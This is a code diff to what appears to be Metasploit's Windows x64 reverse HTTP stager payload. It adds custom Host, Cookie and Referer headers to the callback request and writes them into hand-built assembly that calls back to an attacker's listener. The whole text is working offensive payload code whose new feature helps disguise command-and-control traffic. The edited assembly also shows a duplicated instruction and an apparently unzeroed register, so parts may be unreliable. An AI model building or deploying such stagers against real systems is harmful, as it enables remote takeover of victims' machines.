@@ -36,7 +36,10 @@ module Payload::Windows::ReverseHttp_x64
         OptPort.new('PayloadProxyPort', [false, 'An optional proxy server port']),
         OptString.new('PayloadProxyUser', [false, 'An optional proxy server username']),
         OptString.new('PayloadProxyPass', [false, 'An optional proxy server password']),
-        OptEnum.new('PayloadProxyType', [false, 'The type of HTTP proxy (HTTP or SOCKS)', 'HTTP', ['HTTP', 'SOCKS']])
+        OptEnum.new('PayloadProxyType', [false, 'The type of HTTP proxy (HTTP or SOCKS)', 'HTTP', ['HTTP', 'SOCKS']]),
+        OptString.new('HttpHeaderHost', [false, 'An optional value to use for the Host HTTP header']),
+        OptString.new('HttpHeaderCookie', [false, 'An optional value to use for the Cookie HTTP header']),
+        OptString.new('HttpHeaderReferer', [false, 'An optional value to use for the Referer HTTP header'])
       ], self.class)
   end
 
@@ -52,14 +55,14 @@ module Payload::Windows::ReverseHttp_x64
 
     conf = {
       ssl:         opts[:ssl] || false,
-      host:        ds['LHOST'],
+      host:        ds['LHOST'] || '127.127.127.127',
       port:        ds['LPORT'],
       retry_count: ds['StagerRetryCount'],
-      retry_wait: ds['StagerRetryWait']
+      retry_wait:  ds['StagerRetryWait']
     }
 
     # add extended options if we do have enough space
-    if self.available_space && required_space <= self.available_space
+    if self.available_space.nil? || required_space <= self.available_space
       conf[:url]        = luri + generate_uri(opts)
       conf[:exitfunk]   = ds['EXITFUNC']
       conf[:ua]         = ds['MeterpreterUserAgent']
@@ -68,12 +71,29 @@ module Payload::Windows::ReverseHttp_x64
       conf[:proxy_user] = ds['PayloadProxyUser']
       conf[:proxy_pass] = ds['PayloadProxyPass']
       conf[:proxy_type] = ds['PayloadProxyType']
+      conf[:custom_headers] = get_custom_headers(ds)
      else
       # Otherwise default to small URIs
       conf[:url]        = luri + generate_small_uri
     end
 
     generate_reverse_http(conf)
+  end
+
+  #
+  # Generate the custom headers string
+  #
+  def get_custom_headers(ds)
+    headers = ""
+    headers << "Host: #{ds['HttpHeaderHost']}\r\n" if ds['HttpHeaderHost']
+    headers << "Cookie: #{ds['HttpHeaderCookie']}\r\n" if ds['HttpHeaderCookie']
+    headers << "Referer: #{ds['HttpHeaderReferer']}\r\n" if ds['HttpHeaderReferer']
+
+    if headers.length > 0
+      headers
+    else
+      nil
+    end
   end
 
   #
@@ -89,6 +109,7 @@ module Payload::Windows::ReverseHttp_x64
         pop rbp           ; rbp now contains the block API pointer
       #{asm_reverse_http(opts)}
     ^
+
     Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
   end
 
@@ -137,8 +158,21 @@ module Payload::Windows::ReverseHttp_x64
     # Proxy options?
     space += 200
 
+    # Custom headers? Ugh, impossible to tell
+    space += 512
+
     # The final estimated size
     space
+  end
+
+  #
+  # Convert a string into a NULL-terminated ASCII byte array
+  #
+  def asm_generate_ascii_array(str)
+    (str.to_s + "\x00").
+      unpack("C*").
+      map{ |c| "0x%.2x" % c }.
+      join(",")
   end
 
   #
@@ -154,6 +188,7 @@ module Payload::Windows::ReverseHttp_x64
   # @option opts [String] :proxy_type The optional proxy server type, one of HTTP or SOCKS
   # @option opts [String] :proxy_user The optional proxy server username
   # @option opts [String] :proxy_pass The optional proxy server password
+  # @option opts [String] :custom_headers The optional collection of custom headers for the payload.
   # @option opts [Integer] :retry_count The number of times to retry a failed request before giving up
   # @option opts [Integer] :retry_wait The seconds to wait before retry a new request
   #
@@ -179,6 +214,8 @@ module Payload::Windows::ReverseHttp_x64
 
     proxy_user = opts[:proxy_user].to_s.length == 0 ? nil : opts[:proxy_user]
     proxy_pass = opts[:proxy_pass].to_s.length == 0 ? nil : opts[:proxy_pass]
+
+    custom_headers = opts[:custom_headers].to_s.length == 0 ? nil : asm_generate_ascii_array(opts[:custom_headers])
 
     http_open_flags = 0
     set_option_flags = 0
@@ -327,16 +364,14 @@ module Payload::Windows::ReverseHttp_x64
 
     if retry_count > 0
       asm << %Q^
-          push #{retry_count}
-          pop rdi
+        push #{retry_count}
+        pop rdi
       ^
     end
-
 
     asm << %Q^
       retryrequest:
     ^
-
 
     if opts[:ssl]
       asm << %Q^
@@ -351,15 +386,30 @@ module Payload::Windows::ReverseHttp_x64
         pop r9                        ; dwBufferLength (4 = size of flags)
         mov r10, #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
         call rbp
+
+        xor r8, r8                    ; dwHeadersLen (0)
       ^
     end
 
-    asm << %Q^
-      httpsendrequest:
-        mov rcx, rsi                  ; hRequest (request handle)
+    if custom_headers
+      asm << %Q^
+        call get_req_headers          ; lpszHeaders (pointer to the custom headers)
+        db #{custom_headers}
+      get_req_headers:
+        pop rdx                       ; lpszHeaders
+        dec r8                        ; dwHeadersLength (assume NULL terminated)
+      ^
+    else
+      asm << %Q^
         push rbx
         pop rdx                       ; lpszHeaders (NULL)
-        xor r8, r8                    ; dwHeadersLen (0)
+      ^
+    end
+
+
+    asm << %Q^
+        mov rcx, rsi                  ; hRequest (request handle)
+        xor r9, r9                    ; lpszVersion (NULL)
         xor r9, r9                    ; lpszVersion (NULL)
         push rbx                      ; stack alignment
         push rbx                      ; dwOptionalLength (0)
